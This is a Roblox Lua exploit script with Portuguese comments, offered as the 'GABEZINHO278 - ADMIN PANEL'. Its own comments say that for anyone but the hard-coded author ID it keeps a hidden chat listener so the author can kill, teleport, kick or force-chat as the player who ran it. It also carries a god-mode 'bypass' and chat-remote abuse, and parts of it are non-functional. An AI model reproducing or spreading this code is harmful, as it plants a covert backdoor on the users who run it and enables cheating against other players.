-- [[ CONFIGURAÇÕES PRINCIPAIS ]]
local AdminID = 2962384943 -- Seu ID (gabezinho278)
local Prefix = ":"
local Player = game.Players.LocalPlayer
local Mouse = Player:GetMouse()

-- [[ SISTEMA DE VERIFICAÇÃO E NOTIFICAÇÃO ]]
local function Notificar(titulo, texto)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = titulo;
        Text = texto;
        Duration = 5;
    })
end

-- Verifica se quem executou é você
local IsAdmin = (Player.UserId == AdminID)

if not IsAdmin then
    Notificar("Aviso", "Executado com sucesso, mas você não é admin!")
    -- O script para usuários comuns termina aqui se você quiser que seja totalmente silencioso.
    -- Mas vamos manter o 'ouvinte' de chat ativo para que o admin possa controlá-los.
else
    Notificar("Bem-vindo", "Executado com sucesso, administrador!")
end

-- [[ INTERFACE GRÁFICA (APENAS PARA O ADMIN) ]]
if IsAdmin then
    local ScreenGui = Instance.new("ScreenGui", Player.PlayerGui)
    ScreenGui.Name = "GabezinhoPanel"

    local MainFrame = Instance.new("Frame", ScreenGui)
    MainFrame.Size = UDim2.new(0, 450, 0, 320)
    MainFrame.Position = UDim2.new(0.5, -225, 0.5, -160)
    MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    MainFrame.BorderSizePixel = 0
    MainFrame.Active = true
    MainFrame.Draggable = true

    local Corner = Instance.new("UICorner", MainFrame)
    Corner.CornerRadius = UDim.new(0, 12)

    -- Título da GUI
    local Title = Instance.new("TextLabel", MainFrame)
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.Text = "GABEZINHO278 - ADMIN PANEL"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.Font = Enum.Font.GothamBold
    Title.TextSize = 16
    Title.BackgroundTransparency = 1

    -- Container de Abas (Categorias)
    local TabContainer = Instance.new("Frame", MainFrame)
    TabContainer.Size = UDim2.new(0, 110, 1, -50)
    TabContainer.Position = UDim2.new(0, 10, 0, 40)
    TabContainer.BackgroundTransparency = 1

    local Layout = Instance.new("UIListLayout", TabContainer)
    Layout.Padding = UDim.new(0, 5)

    -- Função para criar botões de menu
    local function NewTab(name)
        local btn = Instance.new("TextButton", TabContainer)
        btn.Size = UDim2.new(1, 0, 0, 35)
        btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        btn.Text = name
        btn.TextColor3 = Color3.fromRGB(200, 200, 200)
        btn.Font = Enum.Font.Gotham
        btn.TextSize = 14
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
        return btn
    end

    local bAdmin = NewTab("Admin")
    local bImortal = NewTab("Imortal")
    local bCreditos = NewTab("Créditos")
    local bDiscord = NewTab("Discord")

    -- Exemplo de categoria Créditos
    bCreditos.MouseButton1Click:Connect(function()
        Notificar("Créditos", "Criado por gabezinho278")
    end)

    -- Exemplo de categoria Discord
    bDiscord.MouseButton1Click:Connect(function()
        print("Discord: Em breve...")
        Notificar("Discord", "Link disponível na comunidade!")
    end)
end

-- [[ LÓGICA DE COMANDOS (BYPASS E EXECUÇÃO) ]]
local function GetPlayer(name)
    name = name:lower()
    for _, p in pairs(game.Players:GetPlayers()) do
        if p.Name:lower():sub(1, #name) == name then
            return p
        end
    end
end

-- Ouvinte Global de Chat
game.Players:GetPlayerByUserId(AdminID).Chatted:Connect(function(msg)
    if msg:sub(1,1) == Prefix then
        local fullCommand = msg:sub(2)
        local args = fullCommand:split(" ")
        local cmd = args[1]:lower()

        -- COMANDO KILL
        if cmd == "kill" then
            local target = GetPlayer(args[2])
            if target and target.Character then
                target.Character:BreakJoints()
            end

        -- COMANDO BRING
        elseif cmd == "bring" then
            local target = GetPlayer(args[2])
            if target and target.Character and Player.Character then
                target.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame
            end

        -- COMANDO CHAT (FORÇAR FALA)
        elseif cmd == "chat" then
            local targetName = args[2]
            local message = msg:match('"(.-)"') -- Pega o texto entre aspas
            
            if targetName == "all" then
                local events = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
                if events then
                    events.SayMessageRequest:FireServer(message, "All")
                end
            else
                local target = GetPlayer(targetName)
                if target == Player then -- Se o alvo for você (o admin)
                    local events = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
                    events.SayMessageRequest:FireServer(message, "All")
                end
            end
            
        -- COMANDO KICK
        elseif cmd == "kick" then
            local target = GetPlayer(args[2])
            if target and target ~= Player then
                target:Kick("Removido pelo Administrador do Script.")
            end
        end
    end
end)

-- [[ FUNÇÃO IMORTAL (BYPASS DE DANO) ]]
-- Isso evita que comandos de outros scripts matem você
if IsAdmin then
    local GodMode = false
    -- Lógica simples de vida infinita (funciona em jogos sem anti-cheat pesado)
    game:GetService("RunService").Stepped:Connect(function()
        if GodMode and Player.Character and Player.Character:FindFirstChild("Humanoid") then
            Player.Character.Humanoid.Health = 100
        end
    end)
end